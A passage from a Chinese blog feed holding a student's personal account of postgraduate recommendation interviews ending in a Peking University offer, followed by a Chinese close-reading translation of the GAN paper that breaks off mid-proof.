src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_FjMrymeGE8.png"></p><p>另外我报考的这个导师也很好，不push，放实习，毕业要求简单，并且组内补贴也有，实验室算力资源也有，所以当时就想着去西交。</p><hr><h1 id="5-预推免"><a href="#5-预推免" class="headerlink" title="5 预推免"></a>5 预推免</h1><p>预推免投递情况如下，一共投递了20个学校，只有5个入营了。由于夏令营差不多有了两个offer，所以预推免比这两个学校更次的就没有投递。</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/QQ%E6%88%AA%E5%9B%BE20240926195405_qrhVnGF4Vo.png"></p><h2 id="5-1-东南大学优营"><a href="#5-1-东南大学优营" class="headerlink" title="5.1 东南大学优营"></a>5.1 东南大学优营</h2><p>俗话说得好，保研分为“夏令营→东南大学→预推免”，几乎所有学校会开夏令营和预推免两次招生，但是东南大学只有一次。</p><p>东南大学首先需要找导师推荐，之后学院对报名的学生进行初筛，初筛通过的去线下面试。其中Palm实验室很知名，我也是很早的就投递了它们，并且参加了第一批的面试，面试内容如下：</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_CJ4TQ4kt0I.png"></p><p>面试的时候也没问我什么很别扭的问题，而且我感觉我回答也还挺好的。但是最后还是没有被选上，只能再找其他老师。</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_UVXU1Y1Rdr.png"></p><p>当时还挺失望的吧，我有同专业的同学也参加了Palm实验室的面试，不过是第二批和第三批，他们好像都通过了，不知道是不是因为第一批大佬太多的原因，也可能因为我自己太菜了&#x2F;(ㄒoㄒ)&#x2F;~</p><p>之后在练习其他老师的过程中，几乎把做深度学习的除了Palm实验室的能找的老师都找了，只有两个老师回复了我。其中A老师让我做自我介绍PPT，然后进行了一次线上交流，当时老师也和我说了很多。之后我问他推荐结果什么时候可以通知我，他说他可能还得再面试几个学生，然后再通知。</p><p>我怕他最后通知我不给推荐的时候系统填报就快截止了，那时候肯定来不及联系其他老师了。所以我就又联系了B老师，B老师也让我做自我介绍PPT，然后线上面试，面试完之后B当场就告诉我这个推荐名额可以给我，但是可能要我做一个考核任务：一周内写一个<a href="https://zhouzimu.top/2024/07/29/%E5%9F%BA%E4%BA%8E%E8%84%B8%E9%83%A8%E8%A7%86%E9%A2%91%E5%9B%BE%E5%83%8F%E7%9A%84%E6%97%A9%E6%9C%9F%E8%80%81%E5%B9%B4%E7%97%B4%E5%91%86%E8%AF%8A%E6%96%AD%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0/" title="基于脸部视频图像的早期老年痴呆诊断技术综述">基于脸部视频图像的早期老年痴呆诊断技术综述</a>，写完了发给老师之后，就给我推荐了。</p><p>之后成功收到了东南大学的入营通知，如下，当时很开心的，因为可以去南京看一看，一直没去过南京。</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_neBG15_77P.png"></p><p>东南大学的考核只有一天，严格来说只有20分钟左右，只要你面试完就可以走了，没有报道也没有宣讲和机试，面试考核内容如下：</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_8WT1gsVdWw.png"></p><p>当天到东南大学之后，感觉seu好大啊，我还拍了好多照片，当时进学校之后，扫了一个共享单车，我是下午的面试，但是我上午很早就过去了，一是想着熟悉一下环境，二是看看学校的风景。</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_LIA8_muQsA.png"></p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_yiZSYGI37f.png"></p><p>之后就是面试，一开始有个人信息表需要你自己打印带进去，然后发给每一个老师。老师拿到了之后好像就开始填一些信息。之后个人进行PPT自我介绍（5min左右），然后老师提问一两个英文问题，考察你的英语口语能力，在你用英语回答问题的时候，老师就会在下面给你打分。随后面试小组专家考察专业基础知识掌握、科研能力、综合能力及表达交流能力等。提问主要聚焦于你PPT中展示的东西。</p><p>而且，老师问我的好几个问题都是基于我对上一个问题的回答来进行提问的，所以东南大学的面试感觉很灵活，不是说一味的提问专业课。当然我有同学被问到了专业课，老师提问专业课一般是根据你介绍的内容中用到了什么知识点，然后老师去提问和这个相关的专业课，不是说随便提问，所以说还是挺灵活的。</p><p>中午给发了一个餐券，15块钱，去了餐厅之后就点了菜，如下图，感觉很香😋。</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_OUGFuEyKMX.png"></p><p>最后也是成功获得了优秀营员，这样又多了一个offer，但是我联系的这个老师的研究方向是医学图像，自己不太想做交叉，所以有点不太想去东南，最后还是把东南的老师给鸽了🕊</p><h2 id="5-2-川大面试"><a href="#5-2-川大面试" class="headerlink" title="5.2 川大面试"></a>5.2 川大面试</h2><p>川大夏令营投递了计算机学院，但是没有入营，之后预推免又投递了一次，就在一天晚上从图书馆自习结束之后刚要回宿舍，就有一个四川成都的电话📞打过来，当时第一反应就是川大的老师吧。之后老师通知我第二天进行面试，并且在钉钉群上加入组织。</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_X_XdR1pivN.png"></p><p>但是现在报名网站上还是未审核，所以应该是钉钉群通知。面试内容是英语文献翻译和专业课回答。英语文献翻译我当时的内容是强化学习，由于之前学习过一些内容，所以还算比较熟悉。</p><p>专业课问题的话是先给你看计网、操作系统和数据结构的各三个题目，然后从里面选择两个进行回答。计网问的是UDP，OS问的是Unix中提供的管道通信有哪些，数据结构是哈夫曼编码。我选的是数据结构和计网，感觉回答的也挺一般的，后面也没有后续了。</p><p>当时老师问我有没有联系川大的老师，我说没有，可能如果联系老师了的话应该会很容易，但是当时投递川大也就是为了想试一试，并没有真的想去，所以就无所谓了。</p><h2 id="5-3-西交面试"><a href="#5-3-西交面试" class="headerlink" title="5.3 西交面试"></a>5.3 西交面试</h2><p>在面试之前，由于我夏令营通过了老师的考核，所以老师把我上报给学院了。之后预推免面试的时候感觉几乎就是走流程，我介绍完PPT之后，然后老师问我报考的哪个老师，我说xxx。然后就没有问其他问题了，感觉还是挺水的，有点类似弱com。</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_5jJQr_IGZm.png"></p><p>最后还是把西交鸽了，不过老师也很好，说他也能理解我，我在收到北大的offer后当天就和老师说了，希望早告诉老师，这样还有时间找其他同学。</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_NFN6bvvTt3.png"></p><p>还是感觉这位老师，这位老师也很好，我也打听了很多学长，也祝这位老师今后工作顺利。</p><h2 id="5-4-北大软微—梦"><a href="#5-4-北大软微—梦" class="headerlink" title="5.4 北大软微—梦"></a>5.4 北大软微—梦</h2><p>就像上面讲的，在成为综测第一之前，我也没想过投递软微，因为清北独一档，像我们末九的话，几乎只有rank1有机会，成为第一之后，软微的预推免报名通知才出来。而且还有一点，就是去年我们专业的综测排名好像都等到9月20多号之后才出来，但是今年就很早。</p><p>所以我认为这是我的一个机会，我一定要抓住。但是北大的一个习惯就是所有报名材料都要求邮寄过去，应该是所有学校中最麻烦的了。并且还有很多额外的要求，如下：</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_UrHoyLmHVf.png"></p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_3EMs9kZ6Q8.png"></p><p>可以看到要求2封专家推荐信，并且很多材料要求盖章后放入自备信封密封，还要在封口骑缝处加盖学院的章，当时感觉还是挺麻烦的。准备完材料之后就寄顺丰过去了，当天下午6点多寄的，第二天早上8点就到了，很快，这里给顺丰好评。</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/39d3374f555d10a3d7c2c45b090ad67_brG_rPg8zD.jpg"></p><p>邮寄的时候我就抱着试试的态度，不知道会不会进入复试。在材料被签收之后，我每天都到北大报名中查看审核状态，有的时候一天都要看好多次，当时真的很想去，而且也加了很多北大软微和其他学院的学长的联系方式，他们都有我有机会。</p><p>那段时间真的感觉挺煎熬的，因为当时华五一个都没入，如果软微没有的话，估计就去西交了，其实当时已经打算去西交了，东南的准备放弃。所以那几天每天都是圣软微信徒，在网上搜软微的各种信息，记得晚上睡觉的时候还在假想自己如果最后去了北大软微，父母该有多骄傲啊。</p><p>经常听人说去清华北大，但是有几个能去的呢？反正我身边所有亲戚，包括亲戚的亲戚一个都没有，所以当时的我很想去，也不敢想太多，因为怕自己空做白日梦，不敢有很高的期待，怕摔的太惨。</p><p>在9月19号下午的时候，软微有其他方向收到了复试通知，当时我紧张坏了，因为自己没有收到软微的复试通知。那天下午一直在刷小红书，看有没有关键软件的人收到了复试通知。但是没有发现一个，所以猜测可能这个方向还没审核完。</p><p>到晚上吃饭的时候，还过一会就看一下手机有没有收到邮件，晚上学习的时候其实有些忘了。然后忘了当时为什么要看手机，肯定不是为了看有没有收到邮件，然后就突然看到了下面这封邮件(;´༎ຶД༎ຶ`) ：</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_jYNn4IIrzH.png"></p><p>别提当时有多开心了吧，虽然复试不代表最终录取，但是起码给了我面试的机会，所以收到复试通知之后，我立马就去打印承诺书，当天晚上就把自我介绍PPT做好了，然后把材料发了过去，效率相当高，生怕第二天自己忘了。</p><p>之后就收到了面试通知，如下：</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_uPDtRxn4SZ.png"></p><p>收到面试通知之后就立马订了来回的车票和酒店，当时距离面试还有4天时间，所以那4天一直在准备面试的内容，就在9月23号，我踏上了进京之旅。</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_5LTyVg9Ld-.png"></p><p>从车站到酒店的路上打了一个出租车，师傅人挺热情的，问我是来这上学吗？我说来面试，他说是面试教书吗？然后我说是保研，之后他问我去什么学校，我说北大。当时师傅说北京大学都是尖子生，如果进去了就厉害了，当时我也想去呀。之后也聊了很多，最后下车的时候，师傅给我说让我好好学，指定行，当时突然感觉有了一些信心。</p><p>到了酒店之后，上面介绍的川大和西交的面试都是都是9月23号进行的，所以回到酒店之后立马就开始面试了。面完试好像晚上八点了，之后点外面吃了晚饭，第二天早上八点就要去面试。但是当时在酒店一点都不想看了，因为感觉专业课这个真的凭运气，英语口语我也准备差不多了，机试也突击不了，所以就开始玩了。</p><p>第二天早上在外面买了早饭吃过之后，就扫了一个共享单车骑车过去，因为我住的酒店离软微不是很远。</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_ScSVonNdqO.png"></p><p>当时进去之后，心里就感觉很敬畏这个学校，因为这可是北京大学，多少人梦寐以求的顶尖学府。之后就是开始面试了。首先是手写代码，一共2道题，半个小时。签了协议，所以不能透露题目内容。第一道题还是比较简单吧，感觉没用什么算法知识。第二道是一个滑动窗口，当时昨晚第一道用了20分钟，因为它要求你不止写代码，还要把设计思路和时间复杂度都要写上。所以第一个花了一些时间，然后第二个就写的稍微简略点。</p><p>做完两道题之后感觉做的还是挺不错的，可能有些细节有问题，但是整体上算法思想肯定是对的。之后就是面试，我是那一组倒数第2个面试，前面有不少人，当时其实的内心感受是既紧张又不紧张，紧张是因为很想通过这场面试，想好好表现，而且害怕面试问到自己不会的内容；不紧张是因为当时没有什么负担了，能进入复试已经很好了，能和这么好大佬同台竞争我觉得没有什么可后悔的。</p><p>感觉当时做的比较好的一点是，前面有面试结束的人，我都会去问他们面试的流程和内容。大体流程就是上来先抽一个专业课进行回答，然后英文介绍第一张PPT（这一点是我之前没想到的，我之前认为是回答英文问题），然后就是针对个人情况进行提问。</p><p>当时知道了这个流程之后，我能准备的之后英文介绍第一张PPT，因为这个之前从来没有准备过。所以我就把英文自我介绍改了改，同时也加了一些内容，就把这个背熟之后就到我进去面试了。</p><p>进去之后，由于流程我已经清楚了，所以很快就进入状态。抽到的专业课是编译原理，是编译型语言和解释型语言相关的内容，由于我假期复习了，所以答得还算不错。之后PPT介绍啥的我也准备了，所以也很熟练。后面就是问了我一些论文的问题，然后还延伸到GNN，这个我也提前准备了，回答得很好。最后面试结束，我整体的感觉还是非常不错的，感觉有很大机会能选上，但是我也不敢保证，因为你感觉的并不是面试老师感觉的，最后还是要等结果通知。</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_179ayOk0ML.png"></p><p>软微面试结束，其实我的所有保研相关的面试也都结束了，所以当时耳机里放着歌，心里想着这一路走来的颠沛流离，还是深有感触。心想一切都结束了，再也不用复习那个专业课、背英语问题了。我也有西交保底了，软微我也尽力了，剩下的就看天意了。</p><p>当天晚上就回到宿舍了，现在仍记忆尤新，那天晚上有些失眠，因为问了学长大概多久会出结果，说是一两天就差不多了。所以一直在想能不能通过软微，同时也在幻想自己如果通过了软微的面试，那该多好啊…..</p><p>第二天起床后，由于面试什么的都没了，所以就在宿舍玩游戏，然后也忘了软微这件事了。就在我打开手机屏幕的时候，看到来了一封邮件，如下：</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_BlZ7V7NA7d.png"></p><p>我感觉无论用多么华丽、多么朴实的语言都无法描述出我当时的感受，真的是梦想成真的感觉。自己努力了那么久，付出了那么多，你说多吗，好像有比我更努力的，你说不多吗，我为了保研把我能做的努力好像都做了吧。最后，我通过面试了，我通过面试了，我真的通过面试了。</p><p>看到这个结果后，刚开的一把游戏也挂机了（对不起匹配到我的队友），我立马和父母打电话，告诉他们我保上北大了，他们一开始也都是不敢相信，因为可能我和他们说过东南有offer，还有西交。总之，他们特别骄傲开心，我也是，我终于让我妈我爸在别人面前骄傲自豪一回。</p><hr><h1 id="6-推免系统填报"><a href="#6-推免系统填报" class="headerlink" title="6 推免系统填报"></a>6 推免系统填报</h1><p>推免系统开放后一开始的一段时间，我一直查不到保研资格，过了好几天再次打开推免系统的时候，突然就可以查到了。</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_HJZ4Z3wurV.png"></p><p>当时看到自己是计算机科学与技术，专业排名第一，就感觉一切努力、一切付出、一切起早贪黑都值得了，很是开心，因为自己高中的时候当过第一，知道那种感觉，但是上了大学之后好像就没当过第一了，如今我又重新回到了这个位置，感慨万分。之后就开始填各种信息，并缴费。</p><p>9月28号开始填志愿，我填了北大软微和天大智算，其实天大是没必要填的，因为软微是稳得，但是一共可以填3个志愿，只填一个心理有点不得劲哈哈哈，还是填上了。</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_znH0kOiEnW.png"></p><p>9月29号，开始录取，在等待的过程中可以说是非常焦急，因为看到有很多人都收到了复试通知以及待录取通知，过了半个小时，9:29的时候收到了复试通知，然后马上点了接受。</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/image_8gg2Sn8VHj.png"></p><p>剩下的就是待录取通知了，不过这时候已经不慌了，因为肯定会给你发录取通知的，只不过时间早晚的事。终于，过了50分钟后，终于收到了那期待已久的待录取通知，当我点击接收之后，那一刻一切就都结束了，保研结束了，我的大学可以说其实也结束了。</p><p>上岸pku！！！</p><p><img src="/2024/09/29/%E6%88%91%E7%9A%84%E4%BF%9D%E7%A0%94%E4%B9%8B%E8%B7%AF/4653156e245ae7fe87be49859b32e93_Kgs-NZlzok.png"></p><p>感觉从现在开始需要更加努力了，因为已经到了北京大学这个最高水平的平台，周围的人肯定都是top级别的，所以肯定需要更努力才行。从今天开始，大学本科结束，正式进入研0阶段。</p>]]></content>
      
      
      <categories>
          
          <category> 思考总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 保研 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>论文精读4：GAN</title>
      <link href="/2024/09/15/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB4%EF%BC%9AGAN/"/>
      <url>/2024/09/15/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB4%EF%BC%9AGAN/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Abstract"><a href="#1-Abstract" class="headerlink" title="1 Abstract"></a>1 Abstract</h1><p>我们提出了一种通过对抗过程估计生成模型的新框架，在该框架中，我们同时训练两个模型：一个生成模型$G$，它捕捉数据分布；以及一个判别模型$D$，它估计样本来自训练数据而非$G$的概率。$G$的训练过程是最大化$D$犯错误的概率。此框架对应于一个极小极大两人博弈。在任意函数$G$和$D$的空间中，存在一个唯一解，即$G$复现训练数据分布，而$D$在各处等于$\frac{1}{2}$。若模型$G$和$D$由MLP定义，整个系统可通过反向传播进行训练。在训练或样本生成过程中，无需任何马尔可夫链或展开的近似推断网络。实验通过定性和定量评估生成的样本来展示该框架的潜力。</p><hr><h1 id="2-Introduction"><a href="#2-Introduction" class="headerlink" title="2 Introduction"></a>2 Introduction</h1><p>深度学习的潜力在于发现丰富的、层次化的模型[2]，这些模型能够表示人工智能应用中遇到的各种数据的概率分布，例如自然图像、包含语音的音频波形以及自然语言语料库中的符号。迄今为止，深度学习中最显著的成功涉及判别模型，通常是将高维、丰富的感官输入映射到类标记[14, 20]。这些显著的成功主要基于反向传播和暂退法算法，使用分段线性单元[17, 8, 9]，这些单元具有特别良好的梯度特性。深度生成式模型的影响较小，这是由于在极大似然估计及相关策略中，近似许多难以处理的概率计算存在困难，以及在生成式情境中利用分段线性单元优势的困难。我们提出了一种新的生成式模型估计程序，以规避这些难题。</p><p>在提出的对抗网络框架中，生成式模型与对手——一个判别式模型相对立，该判别式模型学习判断一个样本是来自模型分布还是数据分布。生成式模型可以被视为类似于一群伪造者，试图制造假币并在不被发现的情况下使用，而判别式模型则类似于警察，试图检测这些假币。这种游戏中的竞争促使双方改进其方法，直到伪造品与真品无法区分。</p><p>该框架可以为多种模型和优化算法生成特定的训练算法。在本文中，我们探讨了生成模型通过多层感知器传递随机噪声来生成样本的特殊情况，判别模型也是一个多层感知器。我们将此特殊情况称为对抗性网络。在这种情况下，我们可以只非常成功的反向传播和 dropout 算法 [16] 来训练这两个模型，并使用仅使用前向传播从生成模型中采样。不需要近似推理或马尔可夫链。</p><hr><h1 id="3-Related-work"><a href="#3-Related-work" class="headerlink" title="3 Related work"></a>3 Related work</h1><p>直到最近，大多数关于深度生成模型的工作都集中在构造概率分布函数参数规范的模型上，然后可以通过最大化对数似然来训练模型。在这一系列模型中，也许最成功的是深度玻尔兹曼机[25]。这些模型通常具有难以处理的似然函数，因此需要对似然梯度进行多次近似。这些困难推动了“生成机器”模型的开发，这些模型没有明确表示可能性，但能够从所需的分布生成样本。生成随机网络[4]是产生式机器的一个例子，可以用精确的反向传播来训练，而不是Boltzmann机器所需的大量近似。这项工作通过消除生成随机网络中使用的马尔可夫链来扩展生成机器的想法。</p><p>我们的工作通过使用观察到通过生成过程反向传播导数：</p><p>$$<br>\lim_{\sigma\to0}\nabla_{\boldsymbol{x}}\mathbb{E}_{\epsilon\sim\mathcal{N}(0,\sigma^2\boldsymbol{I})}f(\boldsymbol{x}+\epsilon)&#x3D;\nabla _{\boldsymbol{x}}f(\boldsymbol{x})<br>$$</p><p>当我们开发这项工作时，我们不知道Kingma和Welling[18]和Rezendeet等人[23]开发了更一般的随机反向传播规则，允许人们通过方差有限的高斯分布反向传播，并反向传播到协方差参数和平均值。这些反向传播规则可以让人们学习生成器的条件方差，我们在这项工作中将其视为超参数。Kingma和Welling[18]和Rezende等人[23]使用随机反向传播来训练变分自编码器（VAEs）。与生成对抗网络一样，变分自动编码器将可微生成器网络与第二个神经网络配对。与生成对抗网络不同，VAE 中的第二个网络是一个执行近似推理的识别模型。GAN 需要通过可见单元进行微分，因此无法对离散数据进行建模，而 VAE 需要通过隐藏单元进行微分，因此无法具有离散的潜在变量。存在其他类似 VAE 的方法[12, 22]，但与我们的方法不太密切相关。</p><p>以前的工作也采用了使用判别准则来训练生成模型的方法[29,13]。这些方法使用深度生成模型难以处理的标准。这些方法甚至很难近似深度模型，因为它们涉及概率的比率，而这些比率不能用下限概率的变分近似来近似。噪声对比估计（NCE）[13] 涉及通过学习使模型对区分数据和固定噪声分布有用的权重来训练生成模型。使用先前训练的模型作为噪声分布允许训练一系列质量不断提高的模型。这可以看作是一种非正式的竞争机制，在精神上类似于对抗网络游戏中使用的正式竞争。NCE的关键限制是它的“鉴别器”是由噪声分布概率密度与模型分布的比值定义的，因此需要能够通过两个密度评估和反向传播的能力。</p><p>以前的一些工作使用了拥有两个神经网络竞争的一般概念。最相关的工作是可预测性最小化[26]。在可预测性最小化中，神经网络中的每个隐藏单元都经过训练以与第二个网络的输出不同，后者在给定所有其他隐藏单元的值的情况下预测该隐藏单元的值。这项工作与可预测性最小化在三个重要方面有所不同：</p><ol><li>在这项工作中，网络之间的竞争是唯一的训练标准，并且足以训练网络。可预测性最小化只是一个正则化器，它鼓励神经网络的隐藏单元在完成其他任务时在统计上是独立的；这不是一个主要的训练标准。</li><li>比赛的性质不同。在可预测性最小化中，比较了两个网络的输出，其中一个网络试图使输出相似，另一个试图使输出不同。问题的输出是单个标量。在 GAN 中，一个网络产生一个丰富的高维向量，用作另一个网络的输入，并尝试选择另一个网络不知道如何处理的输入。</li><li>学习过程的规范不同。可预测性最小化被描述为一个目标函数最小化的优化问题，学习方法接近目标函数的最小值。GAN 基于极小极大游戏而不是优化问题，并且具有一个模型寻求最大化的价值函数，另一个模型寻求最小化。该游戏在一个鞍点终止，鞍点相对于一个玩家的策略是最小的，相对于另一个玩家的策略是最大的。</li></ol><p>生成对抗网络有时与“对抗性示例”[28]的相关概念混淆。对抗性示例是通过在分类网络的输入上使用基于梯度的优化来找到的示例，以便找到与尚未错误分类的数据相似的示例。这与目前的工作不同，因为对抗性示例不是训练生成模型的机制。相反，对抗性示例主要是分析工具，表明神经网络以有趣的方式表现，通常自信地以高置信度对两幅图像进行分类，即使它们之间的差异是人类观察者无法察觉的。这种对抗性示例的存在确实表明生成对抗网络训练可能是低效的，因为它们表明可以使现代判别网络自信地识别一个类，而不模拟该类的任何人类可感知属性。</p><hr><h1 id="4-Adversarial-nets"><a href="#4-Adversarial-nets" class="headerlink" title="4 Adversarial nets"></a>4 Adversarial nets</h1><p>当模型都是<code>MLP</code>时，对抗性建模框架最容易应用。为了学习生成器在数据$x$上的分布$p_g$，我们定义了输入噪声变量$p_z(z)$的先验，然后将映射到数据空间的映射表示为$G(z;θ_g)$，其中$G$是一个可微函数，由参数为$θ_g$的多层感知器表示。我们还定义了一个输出单个标量的第二个多层感知器$D(x;θ_d)$。$D(x) $表示$  x  $来自数据而不是$p_g$的概率。我们训练$D$以最大化将正确标签分配给来自$G $的训练示例和样本的概率。我们同时训练$  G  $以最小化$ log(1 − D(G(z)))$。换句话说，$D $和$  G  $进行以下具有价值函数$  V (G, D)  $的两人极小极大游戏：</p><p><img src="/2024/09/15/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB4%EF%BC%9AGAN/image.png"></p><p>在下一节中，我们对对抗网络进行了理论分析，本质上表明训练标准允许人们恢复数据生成分布，因为$  G  $和$  D  $被赋予足够的容量，即在非参数限制下。有关该方法的正式、更具教学性的解释，请参见图 1。在实践中，我们必须使用迭代数值方法实现游戏。在训练的内环中优化$  D  $以完成在计算上是令人望而却步的，并且在有限的数据集上会导致过度拟合。相反，我们在优化$  D  $的$  k  $步和优化$  G  $的一步之间交替。这导致$  D  $保持在其最优解附近，只要$  G  $变化足够缓慢。该过程在算法 1 中正式介绍。</p><p><img src="/2024/09/15/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB4%EF%BC%9AGAN/image_QDpF3BBGAI.png"></p><blockquote><p>图 1：生成对抗网络是通过同时更新判别分布（$D$、蓝色、虚线）来训练的，以便它将样本与数据生成分布（黑色、虚线）$p_x$的样本与生成分布$ p_g (G)$（绿色、实线）的样本区分开来。在这种情况下，较低的水平线是均匀采样$  z  $的域。上面的水平线是$  x  $的域的一部分。向上箭头表示映射$  x &#x3D; G(z)  $如何在转换后的样本上施加非均匀分布$ p_g$。$G$在高密度区域收缩，在$ p_g$密度较低的区域扩展。<br>(a) 考虑收敛附近的对抗性对：$ p_g$类似于$ p_{data}$，$D $是部分准确的分类器<br>(b) 在算法$D$的内部循环中，被训练以区分样本和数据，收敛到$D^*(x)&#x3D;\frac{p_{\text {data }}(\boldsymbol{x})}{p_{\text {data }}(\boldsymbol{x})+p_{g}(\boldsymbol{x})}$<br>(c) 在对$G$进行更新后，$D $的梯度引导$  G(z)  $流向更有可能被归类为数据的区域<br>(d) 经过几个步骤的训练，如果$  G  $和$  D  $有足够的容量，它们将达到一个点，此时两者都不能改善，因为$p_g &#x3D; p_{data}$。鉴别器无法区分两个分布，即$ D(x) &#x3D; \frac{1}{2}$</p></blockquote><p>在实践中，公式 1 可能无法为$  G  $提供足够的梯度才能很好地学习。早期在学习时，当$  G  $很差时，$D$可以高置信度拒绝样本，因为它们与训练数据明显不同。在这种情况下，$log(1−D(G(z))) $饱和。我们可以训练$ G$以最大化$  log D(G(z))  $而不是训练$  G  $以最小化$ log(1−D(G(z)))$。这个目标函数导致$  G  $和$D$的动力学的相同不动点，但在学习早期提供了更强的梯度。</p><hr><h1 id="5-Theoretical-Results"><a href="#5-Theoretical-Results" class="headerlink" title="5 Theoretical Results"></a>5 Theoretical Results</h1><p>生成器$  G  $隐含地将概率分布$  p_g  $定义为当$  z ∼ p_z  $时获得的样本$  G(z)  $的分布。因此，如果有足够的容量和训练时间，我们希望算法 1 收敛到$ p_{data}$的良好估计器。本节的结果是在非参数设置中完成的，例如我们通过研究概率密度函数空间中的收敛来表示具有无限容量的模型。</p><p>我们将在第 4.1 节中展示，这个极小极大游戏对于$p_{g}&#x3D;p_{\text {data }}$具有全局最优值。然后，我们将在第 4.2 节中展示算法 1 优化等式 1，从而获得所需的结果。</p><h2 id="5-1-p-g-p-text-data-的全局最优性"><a href="#5-1-p-g-p-text-data-的全局最优性" class="headerlink" title="$5.1 p_{g}&#x3D;p_{\text {data }}$的全局最优性"></a>$5.1 p_{g}&#x3D;p_{\text {data }}$的全局最优性</h2><p>我们首先考虑任何给定生成器$  G  $的最优鉴别器$ D$。</p><p><strong>命题1：</strong>对于$G$固定，最优鉴别器$D$为：</p><p>$$<br>D_{G}^{*}(\boldsymbol{x})&#x3D;\frac{p_{\text {data }}(\boldsymbol{x})}{p_{\text {data }}(\boldsymbol{x})+p_{g}(\boldsymbol{x})} \quad \quad (2)<br>$$</p><p><strong>证明：</strong>鉴别器$  D  $的训练标准，给定任何生成器$ G$，是最大化$ V (G, D)$：</p><p>$$<br>\begin{aligned} V(G, D) &amp; &#x3D;\int_{\boldsymbol{x}} p_{\text {data }}(\boldsymbol{x}) \log (D(\boldsymbol{x})) d x+\int_{\boldsymbol{z}} p_{\boldsymbol{z}}(\boldsymbol{z}) \log (1-D(g(\boldsymbol{z}))) dz \\ &amp; &#x3D;\int_{\boldsymbol{x}} p_{\text {data }}(\boldsymbol{x}) \log (D(\boldsymbol{x}))+p_{g}(\boldsymbol{x}) \log (1-D(\boldsymbol{x})) d x\end{aligned} \quad \quad (3)<br>$$</p><p>对于任何$(a, b) \in \mathbb{R}^{2} \backslash{0,0}$，函数$y \rightarrow a \log (y)+b \log (1-y)$在$\frac{a}{ a+b }$处达到的最大值位于$ [0, 1]$。判别器$D$不需要在$\operatorname{Supp}\left(p_{\text {data }}\right) \cup \operatorname{Supp}\left(p_{g}\right)$之外定义，包括证明。</p><p>请注意，$D$的训练目标可以解释为最大化估计条件概率$P(Y&#x3D;y \mid \boldsymbol{x})$的对数似然，其中$  Y  $表示$  x  $是来自$  pdata(y &#x3D; 1)  $还是来自$ pg (y &#x3D; 0)$。方程式（1）中的极小极大博弈现在可以重新表述为：</p><p><img src="/2024/09/15/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB4%EF%BC%9AGAN/image1.png"></p><p><strong>定理1</strong>：当且仅当$P_g &#x3D; P_{data}$时，虚拟训练准则$C(G)$的全局最小值。此时，$C(G) $达到值$ - log 4$。</p><p><strong>证明：</strong>对于$P_g &#x3D; P_{data}$，$D_{G}^{*}(\boldsymbol{x})&#x3D;\frac{1}{2}$，（考虑式2）。因此，通过检查公式4，在$D_{G}^{*}(\boldsymbol{x})&#x3D;\frac{1}{2}$时，我们发现$C(G)&#x3D;\log \frac{1}{2}+\log \frac{1}{2}&#x3D;-\log 4$。要了解这是$  C(G)  $的最佳可能值，仅针对$P_g &#x3D; P_{data}$达到，观察到：</p><p><img 